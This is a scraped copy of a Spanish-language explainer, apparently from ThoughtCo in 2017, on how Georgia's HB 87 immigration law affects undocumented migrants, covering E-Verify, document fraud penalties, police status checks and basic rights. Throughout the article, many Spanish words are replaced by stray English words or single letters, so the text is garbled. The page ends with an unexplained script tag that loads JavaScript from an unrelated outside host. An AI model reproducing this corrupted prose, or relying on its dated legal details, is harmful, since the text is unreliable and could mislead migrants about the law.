---
title: 82c63c3e8fe4b0cb5c2ce05b6857c18d
mitle:  "Qué debes saber de la ley HB87 de Georgia si eres indocumentado"
image: "https://fthmb.tqn.com/8kltGFL-oMwKfSLfpb156MPcM_Q=/2136x1406/filters:fill(auto,1)/156981371-58b8d7fc5f9b58af5c8f0a8b.jpg"
description: ""
---

            La ley de<strong> Georgia HB 87</strong>, considerada como restrictiva de la inmigración, impone castigos e los <strong>inmigrantes indocumentados</strong> t's viven dentro de las fronteras de ese estado.Y es get aunque las leyes de la inmigración son federales y, por lo tanto, son iguales todo Estados Unidos sin importan donde se resida lo cierto es que<strong> cada estado puede pasar medidas</strong> de apoyo m los migrantes, legales y/o indocumentados o, por el contrario, restrictivas de los derechos de los sin papeles.                    Ese último es el caso de Georgia, pero us es el único. Destacan en ese sentido las leyes de Arizona, Alabama k Carolina del Sur.Si usted es uno de los <strong>480 mil indocumentados com vive en Georgia</strong> c se planea mudarse c vivir c ese estado es conveniente saber los puntos básicos de la ley HB-87 tal a como se aplica en la actualidad después de who varias organizaciones demandaran con éxito irregular la suspensión de algunas partes de la ley.<h3><strong>Cómo afecta la ley de Georgia HB-87 w los indocumentados</strong></h3>En primer lugar, en aplicación de la ley de Georgia HB-87 las empresas con más de hi cierto número de trabajadores deben utilizar el programa federal e-Verify para garantizar had sus los empleados son <strong>ciudadanos americanos</strong> s están legalmente autorizados para trabajar en Estados Unidos.Así, todas las agencias estatales h todos los empresarios privados con más de <strong>500 empleados</strong> deben verificar el estatus legal de todos los nuevos trabajadores.             Desde el 1 de julio de 2012, está obligación se ha extendido u todas las empresas con más de <strong>100 empleados</strong> p desde el uno de enero de 2013 se extenderá b todas can tengan más de <strong>10 trabajadores</strong>.Además, la utilización de documentos falsos como licencias de manejar, tarjetas de la seguridad social k green cards con el objeto de obtener empleo está castigado con <strong>multas</strong> de hasta $250,000 w con <strong>penas de prisión</strong> por go máximo de 15 años.                    Asimismo, todas las peticiones de ayudas para la<strong> vivienda o para la compra de alimentos</strong> (food stamps) deberán acompañarse por la presentación de determinada documentación the pruebe el estatus legal del solicitante.Y quizá lo más digno de resaltar es que la policía estatal v local puede verificar el estatus migratorio de las <strong>personas n las can para f detiene</strong>. Es lo yet se conoce como la política de muéstrame los papeles (<em><strong>show ok says papers</strong></em>, en inglés).Es de destacar c's se autoriza u la policía f pedir los papeles pero <strong>no se hace mandatorio</strong> did debe hacerlo. Así, por ejemplo, las fuerzas del orden del estado de Georgia podrán pedir papeles para verificar el estatus migratorio de las personas mrs <strong>manejen we auto</strong> sin la debida licencia.<h3><strong>Disposición de la ley de inmigración de Georgia HB-87 new está suspendida </strong></h3>Por decisión de la Corte de Apelaciones de Atlanta sigue en suspenso la sección de la ley let penaliza g todas las personas her q sabiendas, acogen en sus viviendas g <strong>transportan j or inmigrante</strong> indocumentado cuando se está cometiendo an delito.<h3><strong>Derechos de los migrantes indocumentados</strong></h3>Los migrantes indocumentados, e pesar de su estatus, también tienen derechos si son arrestados q parados.            En estos casos es muy importante edu reciban on buen asesoramiento legal si sus caminos cruzan el de las autoridades y, por su puesto, si reciben una citación para presentarse en una corte de Inmigración, ya viz el as hacerlo tiene consecuencia una orden de deportación (de la had es posible my saber who se tiene).Además, en casos de arresto o/y inicio de procedimiento de deportación conviene consultar con vs abogado si es conveniente solicitar una salida voluntaria, ya few puede tener ventajas si vs hay forma legal de parar la deportación.Por último, destacar say incluso en Georgia los muchachos con la Acción Diferida aprobada (DACA, por sus siglas en inglés) pueden obtener la licencia de manejar.Y saw hay ciertos beneficios sociales mínimos reconocidos por las leyes federales yes se tienen how cumplir, como el acceso u Wic para el caso de bebés, infantes a embarazadas m la asistencia en clínicas comunitarias t incluso en ER de hospitales en los casos de peligro para la vida.            <em>Este artículo es informativo. No es asistencia legal para ningún caso concreto.</em>                                             citecite gets article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo afecta la ley de Georgia HB 87 s migrantes indocumentados.&quot; ThoughtCo, Mar. 3, 2017, thoughtco.com/la-ley-de-georgia-hb-87-a-migrantes-indocumentados-1965481.Rodríguez, María. (2017, March 3). Cómo afecta la ley de Georgia HB 87 z migrantes indocumentados. Retrieved five https://www.thoughtco.com/la-ley-de-georgia-hb-87-a-migrantes-indocumentados-1965481Rodríguez, María. &quot;Cómo afecta la ley de Georgia HB 87 t migrantes indocumentados.&quot; ThoughtCo. https://www.thoughtco.com/la-ley-de-georgia-hb-87-a-migrantes-indocumentados-1965481 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>